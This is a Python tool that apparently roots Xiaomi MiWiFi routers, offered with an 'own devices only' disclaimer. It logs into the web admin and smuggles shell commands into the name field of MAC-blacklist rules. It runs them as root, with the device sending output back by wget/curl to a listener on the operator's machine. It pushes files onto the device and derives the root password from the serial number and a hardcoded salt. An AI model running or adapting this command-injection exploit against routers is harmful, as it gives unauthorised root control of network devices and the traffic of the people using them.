#!/usr/bin/env python3
"""MiWiFi root helper.

Tested on BE5000 / RD18 / MiWiFi 1.0.91. The login flow and the primitives are
framework-level, so other models are plausible but unverified.

Own devices only -- see the disclaimer at the top of README.md / README.cn.md.

This tool exposes primitives, not procedures. It logs in, runs what you ask and
shows you the output, or copies a file to the device. The order in which those
should be combined to install a persistent SSH server is written out in the
README, so every step is visible and adjustable rather than buried in a wrapper
that reports success as a single bit.

  --verify        confirm uid 0 by timing; needs no listening port
  --cmd '<line>'  run one command, print its stdout+stderr
  --shell         run commands interactively
  --push A B      copy local file A to path B on the device
  --cleanup       delete the inert rules this tool leaves in the MAC blacklist
"""
import argparse, base64, os, random, re, socket, subprocess, threading, time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

# Root password of a stock MiWiFi device is md5(SN + salt)[:8]. The salt is a
# constant in Xiaomi's own firmware tooling, so we compute it locally instead of
# sending the serial number to some third-party web calculator.
XQ_ROOT_SALT = "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"


def root_password(sn):
    import hashlib
    return hashlib.md5((sn + XQ_ROOT_SALT).encode()).hexdigest()[:8]


def sha1(s):
    import hashlib
    return hashlib.sha1(s.encode()).hexdigest()


def shquote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def inert_mac():
    """A locally-administered address no real client can present, so the rule
    that carries our payload cannot affect any device on the network."""
    return "02:F0:%02X:%02X:%02X:%02X" % tuple(random.randrange(256) for _ in range(4))


def local_ip_for(target):
    """An address of this machine that the router can route back to."""
    prefix = ".".join(target.split(".")[:2])
    out = subprocess.run(["ifconfig"], capture_output=True, text=True).stdout
    for chunk in out.split("inet ")[1:]:
        ip = chunk.split()[0]
        if ip.startswith(prefix + "."):
            return ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((target, 53))
    ip = s.getsockname()[0]
    s.close()
    return ip


def request(host, path, body=None, ctype=None, timeout=25, proxy=None):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-A", UA, "-w", "\n%{http_code}"]
    if proxy:
        cmd += ["-x", proxy]
    if body is not None:
        cmd += ["-X", "POST", "--data-binary", body]
    if ctype:
        cmd += ["-H", "Content-Type: %s" % ctype]
    cmd.append("http://%s%s" % (host, path))
    r = subprocess.run(cmd, capture_output=True, text=True)
    text, _, code = r.stdout.rpartition("\n")
    if not code.strip().isdigit():
        raise SystemExit("request failed: %s" % (r.stderr or text).strip()[:200])
    return code.strip(), text


class Router:
    def __init__(self, host, password, proxy=None):
        self.host, self.password, self.proxy = host, password, proxy
        self.stok = None

    def login(self):
        _, page = self.fetch("/cgi-bin/luci/web/home")
        dev = re.search(r"var deviceId = '(.*?)'", page)
        nkey = re.search(r"key: '(.*)',", page)
        if not dev or not nkey:
            raise SystemExit("%s: not a stock MiWiFi login page" % self.host)
        nonce = "0_%s_%d_%d" % (dev.group(1), int(time.time()), 1000 + os.getpid() % 9000)
        pwd = sha1(nonce + sha1(self.password + nkey.group(1)))
        body = urllib.parse.urlencode({"username": "admin", "password": pwd,
                                       "logtype": "2", "nonce": nonce})
        _, text = self.fetch("/cgi-bin/luci/api/xqsystem/login", body=body,
                             ctype="application/x-www-form-urlencoded")
        m = re.search(r'"token":"(.*?)"', text)
        if not m:
            raise SystemExit("%s: login failed: %s" % (self.host, text[:200]))
        self.stok = m.group(1)
        return self.stok

    def fetch(self, path, **kw):
        return request(self.host, path, proxy=self.proxy, **kw)

    def api(self, path, data=None):
        url = "/cgi-bin/luci/;stok=%s/api/%s" % (self.stok or "", path)
        if data is None:
            return self.fetch(url)
        return self.fetch(url, body=urllib.parse.urlencode(data),
                          ctype="application/x-www-form-urlencoded")

    def add_rule(self, mac, name, option="0"):
        return self.api("xqsystem/set_macfilter_rules",
                        {"mac": mac, "name": name, "option": option})[1]

    def macs(self):
        _, t = self.api("xqsystem/get_macfilter_info")
        return re.findall(r'"mac":"([^"]+)"', t)

    def timed(self, shell_test, extra=3):
        """True when shell_test succeeds, read off the response time. The only
        check that needs no listening port, so --verify can stand alone."""
        mac = inert_mac()
        t0 = time.time()
        self.add_rule(mac, "q$(%s && sleep %d)" % (shell_test, extra))
        hit = (time.time() - t0) > 0.4 + extra * 0.6
        self.add_rule(mac, "q", option="1")
        return hit


class Server:
    """Hands files to the router under /f/ and collects results under /r/."""

    def __init__(self, port, root=None):
        self.results = []
        # realpath on both sides: on macOS /Volumes/Data is a firmlink, so an
        # abspath-only prefix check rejects every legitimate file.
        self.root = os.path.realpath(root) if root else None
        outer = self

        class H(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/r/"):
                    outer.results.append(outer.decode(self.path[3:].strip("/")))
                    body = b"ok"
                elif self.path.startswith("/f/") and outer.root:
                    name = os.path.basename(self.path[3:])
                    fp = os.path.realpath(os.path.join(outer.root, name))
                    if not fp.startswith(outer.root + os.sep) or not os.path.isfile(fp):
                        self.send_error(404)
                        return
                    body = open(fp, "rb").read()
                else:
                    body = b"?"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        try:
            self.httpd = HTTPServer(("0.0.0.0", port), H)
        except OSError as e:
            raise SystemExit(
                "cannot listen on port %d (%s).\n"
                "Command output and file downloads both ride on this port, so it\n"
                "must be free and reachable from the router. Choose another with\n"
                "--port, or find who holds it:\n"
                "  lsof -nP -iTCP:%d -sTCP:LISTEN" % (port, e, port))
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    @staticmethod
    def decode(token):
        try:
            pad = "=" * (-len(token) % 4)
            return base64.urlsafe_b64decode(token + pad).decode("utf-8", "replace")
        except Exception as e:
            return "!! could not decode result (%s); raw token was %r" % (e, token[:80])


def run_cmd(rt, srv, port, cmd, timeout=120):
    """Run cmd on the device and return its combined stdout+stderr.

    The command travels base64-encoded so quotes, semicolons and pipes survive
    the layers between here and the device's shell.
    """
    me = local_ip_for(rt.host)
    script = "\n".join([
        "/bin/ash -c %s > /tmp/.q.out 2>&1" % shquote(cmd),
        "b=$(base64 /tmp/.q.out 2>/dev/null | tr -d '\\n' | tr '/+' '_-')",
        'wget -q -O /dev/null "http://%s:%d/r/$b" || curl -s -o /dev/null "http://%s:%d/r/$b"'
        % (me, port, me, port),
        "rm -f /tmp/.q.out",
    ])
    blob = base64.b64encode(script.encode()).decode()
    mac = inert_mac()
    before = len(srv.results)
    rt.add_rule(mac, "q$(echo %s | base64 -d | /bin/ash)" % blob)
    deadline = time.time() + timeout
    while time.time() < deadline:
        if len(srv.results) > before:
            rt.add_rule(mac, "q", option="1")
            out = srv.results[-1]
            return out if out.strip() else "(no output)"
        time.sleep(0.5)
    rt.add_rule(mac, "q", option="1")
    return ("!! no result within %ds (the router has to reach %s:%d). If the "
            "command legitimately runs longer, raise --timeout instead of "
            "splitting it; if it should be instant, check inbound on that port."
            % (timeout, me, port))


def push(rt, srv, port, local, remote, timeout=120):
    if not os.path.isfile(local):
        raise SystemExit("no such local file: %s" % local)
    d, base = os.path.split(remote.rstrip("/"))
    d = d or "/"
    # The download URL must name the LOCAL file -- the server only knows files
    # by the name they have in --push's source directory, which need not match
    # the name we are writing them as on the device.
    src = urllib.parse.quote(os.path.basename(local))
    mode = oct(os.stat(local).st_mode & 0o7777)[-3:]
    # Land on a temp name in the destination directory and mv over it: rename()
    # swaps the inode and works even if the target is a running executable,
    # whereas wget -O over it would fail with ETXTBSY. The temp must live on the
    # same filesystem, since a cross-device mv degrades to copy+truncate.
    cmd = ("mkdir -p %s && cd %s && wget -q -O .%s.push 'http://%s:%d/f/%s'"
           " && chmod %s .%s.push && mv .%s.push %s && ls -l %s"
           % (shquote(d), shquote(d), base, local_ip_for(rt.host), port, src,
              mode, base, base, shquote(base), shquote(remote)))
    return run_cmd(rt, srv, port, cmd, timeout)


def verify(rt):
    print("     uid==0        : %s" % rt.timed("id -u | grep -qx 0"))
    print("     /etc/shadow w : %s" % rt.timed("test -w /etc/shadow"))
    print("     control       : %s   <- must be False" % rt.timed("id -u | grep -qx 12345"))


def cleanup(rt):
    mine = [m for m in rt.macs() if m.lower().startswith("02:f0:")]
    for m in mine:
        rt.add_rule(m, "q", option="1")
    print("     removed %d inert rule(s); blacklist now holds %d" % (len(mine), len(rt.macs())))


def main():
    ap = argparse.ArgumentParser(
        description="MiWiFi root helper -- own devices only",
        epilog=__doc__.rstrip().split("\n\n")[-1],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default=os.environ.get("MIWIFI_HOST", ""),
                    help="router IP of a single device (or MIWIFI_HOST)")
    ap.add_argument("--password", default=os.environ.get("MIWIFI_PASS", ""), help="web admin password")
    ap.add_argument("--proxy", default=None, help="HTTP proxy used to reach the API")
    ap.add_argument("--port", type=int, default=8000, help="port the router calls back to")
    ap.add_argument("--timeout", type=int, default=120,
                    help="seconds to wait for a command result; raise it for slow "
                         "commands instead of splitting them")
    ap.add_argument("--verify", action="store_true", help="confirm uid 0 by timing, no port needed")
    ap.add_argument("--cmd", help="run one command and print its output")
    ap.add_argument("--shell", action="store_true", help="interactive command loop")
    ap.add_argument("--push", nargs=2, metavar=("LOCAL", "REMOTE"),
                    help="copy a local file to a path on the device")
    ap.add_argument("--cleanup", action="store_true", help="delete inert rules this tool left")
    ap.add_argument("--root-pass", nargs="?", const="", metavar="SN",
                    help="print the derived root password; without SN it is read "
                         "from the device (needs the admin password to login)")
    a = ap.parse_args()

    if a.root_pass:
        # A serial was given outright, so this is pure local arithmetic: no
        # login, no network, works even with the router switched off.
        print("     SN          : %s" % a.root_pass)
        print("     root passwd : %s" % root_password(a.root_pass))
        return

    if not a.host:
        raise SystemExit("no router address: export MIWIFI_HOST or pass --host")
    if not a.password:
        raise SystemExit("no password: export MIWIFI_PASS or pass --password")
    if not (a.verify or a.cmd or a.shell or a.push or a.cleanup or a.root_pass is not None):
        ap.print_help()
        raise SystemExit

    srv = None
    if a.cmd or a.shell or a.push:
        root = os.path.dirname(os.path.abspath(a.push[0])) if a.push else None
        srv = Server(a.port, root)

    rt = Router(a.host, a.password, a.proxy)
    rt.login()
    print("[%s] login ok, stok=%s.." % (a.host, rt.stok[:8]))
    if a.verify:
        verify(rt)
    if a.push:
        print(push(rt, srv, a.port, a.push[0], a.push[1], a.timeout))
    if a.cmd:
        print(run_cmd(rt, srv, a.port, a.cmd, a.timeout))
    if a.cleanup:
        cleanup(rt)
    if a.root_pass is not None:
        sn = a.root_pass
        if not sn:
            import json
            sn = json.loads(rt.api("misystem/newstatus")[1]).get("hardware", {}).get("sn")
            if not sn:
                raise SystemExit("could not read hardware.sn from the device; "
                                 "pass it explicitly: --root-pass <SN>")
        print("     SN          : %s" % sn)
        print("     root passwd : %s" % root_password(sn))
    if a.shell:
        try:
            while True:
                line = input("root@%s # " % a.host).strip()
                if line:
                    print(run_cmd(rt, srv, a.port, line, a.timeout))
        except EOFError:
            print()
    if srv:
        srv.httpd.shutdown()


if __name__ == "__main__":
    main()
